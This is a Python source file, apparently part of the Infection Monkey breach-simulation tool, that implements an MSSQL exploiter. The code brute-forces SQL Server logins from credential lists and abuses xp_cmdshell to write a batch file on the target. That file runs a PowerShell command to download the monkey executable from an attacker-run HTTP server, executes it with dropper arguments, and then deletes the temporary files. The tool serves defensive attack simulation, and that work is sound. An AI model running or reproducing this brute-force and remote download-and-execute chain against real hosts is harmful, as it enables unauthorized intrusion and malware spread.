import logging
import os
from time import sleep

import pymssql

from common.utils.exploit_enum import ExploitType
from infection_monkey.exploit import HostExploiter
from infection_monkey.exploit.tools.http_tools import HTTPTools
from infection_monkey.exploit.tools.helpers import get_monkey_dest_path, get_target_monkey, \
    build_monkey_commandline, get_monkey_depth
from infection_monkey.model import DROPPER_ARG
from infection_monkey.exploit.tools.payload_parsing import LimitedSizePayload

LOG = logging.getLogger(__name__)


class MSSQLExploiter(HostExploiter):

    _EXPLOITED_SERVICE = 'MSSQL'
    _TARGET_OS_TYPE = ['windows']
    EXPLOIT_TYPE = ExploitType.BRUTE_FORCE
    LOGIN_TIMEOUT = 15
    # Time in seconds to wait between MSSQL queries.
    QUERY_BUFFER = 0.5
    SQL_DEFAULT_TCP_PORT = '1433'

    # Temporary file that saves commands for monkey's download and execution.
    TMP_FILE_NAME = 'tmp_monkey.bat'
    TMP_DIR_PATH = "%temp%\\tmp_monkey_dir"

    MAX_XP_CMDSHELL_COMMAND_SIZE = 128

    XP_CMDSHELL_COMMAND_START = "xp_cmdshell \""
    XP_CMDSHELL_COMMAND_END = "\""
    EXPLOIT_COMMAND_PREFIX = "<nul set /p="
    EXPLOIT_COMMAND_SUFFIX = ">>%(payload_file_path)s"
    CREATE_COMMAND_SUFFIX = ">%(payload_file_path)s"
    MONKEY_DOWNLOAD_COMMAND = "powershell (new-object System.Net.WebClient)." \
                              "DownloadFile(^\'%(http_path)s^\' , ^\'%(dst_path)s^\')"

    def __init__(self, host):
        super(MSSQLExploiter, self).__init__(host)
        self.cursor = None

    def _exploit_host(self):
        # Brute force to get connection
        username_passwords_pairs_list = self._config.get_exploit_user_password_pairs()
        self.cursor = self.brute_force(self.host.ip_addr, self.SQL_DEFAULT_TCP_PORT, username_passwords_pairs_list)

        if not self.cursor:
            LOG.error("Bruteforce process failed on host: {0}".format(self.host.ip_addr))
            return False

        # Get monkey exe for host and it's path
        src_path = get_target_monkey(self.host)
        if not src_path:
            LOG.info("Can't find suitable monkey executable for host %r", self.host)
            return False

        # Create server for http download and wait for it's startup.
        http_path, http_thread = HTTPTools.create_locked_transfer(self.host, src_path)
        if not http_path:
            LOG.debug("Exploiter failed, http transfer creation failed.")
            return False
        LOG.info("Started http server on %s", http_path)

        dst_path = get_monkey_dest_path(http_path)
        tmp_file_path = os.path.join(MSSQLExploiter.TMP_DIR_PATH, MSSQLExploiter.TMP_FILE_NAME)

        # Create dir for payload
        dir_creation_command = MSSQLLimitedSizePayload(command="mkdir %s" % MSSQLExploiter.TMP_DIR_PATH)
        if not self.try_to_run_mssql_command(dir_creation_command):
            return False

        if not self.create_empty_payload_file(tmp_file_path):
            return True

        # Form download command
        monkey_download_command = MSSQLExploiter.MONKEY_DOWNLOAD_COMMAND % {'http_path': http_path,
                                                                            'dst_path': dst_path}
        # Form suffix for appending to temp payload file
        suffix = MSSQLExploiter.EXPLOIT_COMMAND_SUFFIX % {'payload_file_path': tmp_file_path}
        prefix = MSSQLExploiter.EXPLOIT_COMMAND_PREFIX
        monkey_download_command = MSSQLLimitedSizePayload(command=monkey_download_command,
                                                          suffix=suffix,
                                                          prefix=prefix)
        if not self.try_to_run_mssql_command(monkey_download_command):
            return True
        self.run_file(tmp_file_path)

        self.add_executed_cmd(monkey_download_command.command)

        # Clear payload to pass in another command
        if not self.create_empty_payload_file(tmp_file_path):
            return True

        # Form monkey's launch command
        monkey_args = build_monkey_commandline(self.host,
                                               get_monkey_depth() - 1,
                                               dst_path)
        suffix = ">>%s" % tmp_file_path
        prefix = MSSQLExploiter.EXPLOIT_COMMAND_PREFIX
        monkey_launch_command = MSSQLLimitedSizePayload(command="%s %s %s" % (dst_path, DROPPER_ARG, monkey_args),
                                                        prefix=prefix,
                                                        suffix=suffix)
        if not self.try_to_run_mssql_command(monkey_launch_command):
            return True
        self.run_file(tmp_file_path)

        # Remove temporary dir we stored payload at
        tmp_file_removal_command = MSSQLLimitedSizePayload(command="del %s" % tmp_file_path)
        self.try_to_run_mssql_command(tmp_file_removal_command)
        tmp_dir_removal_command = MSSQLLimitedSizePayload(command="rmdir %s" % MSSQLExploiter.TMP_DIR_PATH)
        self.try_to_run_mssql_command(tmp_dir_removal_command)

        return True

    def run_file(self, file_path):
        file_running_command = MSSQLLimitedSizePayload(file_path)
        return self.try_to_run_mssql_command(file_running_command)

    def create_empty_payload_file(self, file_path):
        # Create payload file
        suffix = MSSQLExploiter.CREATE_COMMAND_SUFFIX % {'payload_file_path': file_path}
        tmp_file_creation_command = MSSQLLimitedSizePayload(command="NUL", suffix=suffix)
        return self.try_to_run_mssql_command(tmp_file_creation_command)

    def try_to_run_mssql_command(self, mssql_command):
        array_of_commands = mssql_command.split_into_array_of_smaller_payloads()
        if not array_of_commands:
            LOG.error("Couldn't execute MSSQL because payload was too long")
            return False
        return MSSQLExploiter.execute_commands(self.cursor, array_of_commands)

    @staticmethod
    def execute_commands(cursor, cmds):
        """
        Executes commands on MSSQL server
        :param cursor: MSSQL connection
        :param cmds: list of commands in MSSQL syntax.
        :return: True if successfully executed, false otherwise.
        """
        try:
            # Running the cmd on remote host
            for cmd in cmds:
                cursor.execute(cmd)
                sleep(MSSQLExploiter.QUERY_BUFFER)
        except Exception as e:
            LOG.error('Error sending the payload using xp_cmdshell to host: %s' % e)
            return False
        return True

    def brute_force(self, host, port, users_passwords_pairs_list):
        """
        Starts the brute force connection attempts and if needed then init the payload process.
        Main loop starts here.

        Args:
            host (str): Host ip address
            port (str): Tcp port that the host listens to
            users_passwords_pairs_list (list): a list of users and passwords pairs to bruteforce with

        Return:
            True or False depends if the whole bruteforce and attack process was completed successfully or not
        """
        # Main loop
        # Iterates on users list
        for user, password in users_passwords_pairs_list:
            try:
                # Core steps
                # Trying to connect
                conn = pymssql.connect(host, user, password, port=port, login_timeout=self.LOGIN_TIMEOUT)
                LOG.info(
                    'Successfully connected to host: {0}, using user: {1}, password (SHA-512): {2}'.format(
                        host, user, self._config.hash_sensitive_data(password)))
                self.add_vuln_port(MSSQLExploiter.SQL_DEFAULT_TCP_PORT)
                self.report_login_attempt(True, user, password)
                cursor = conn.cursor()
                return cursor
            except pymssql.OperationalError:
                self.report_login_attempt(False, user, password)
                # Combo didn't work, hopping to the next one
                pass

        LOG.warning('No user/password combo was able to connect to host: {0}:{1}, '
                    'aborting brute force'.format(host, port))
        return None


class MSSQLLimitedSizePayload(LimitedSizePayload):
    def __init__(self, command, prefix="", suffix=""):
        super(MSSQLLimitedSizePayload, self).__init__(command=command,
                                                      max_length=MSSQLExploiter.MAX_XP_CMDSHELL_COMMAND_SIZE,
                                                      prefix=MSSQLExploiter.XP_CMDSHELL_COMMAND_START+prefix,
                                                      suffix=suffix+MSSQLExploiter.XP_CMDSHELL_COMMAND_END)
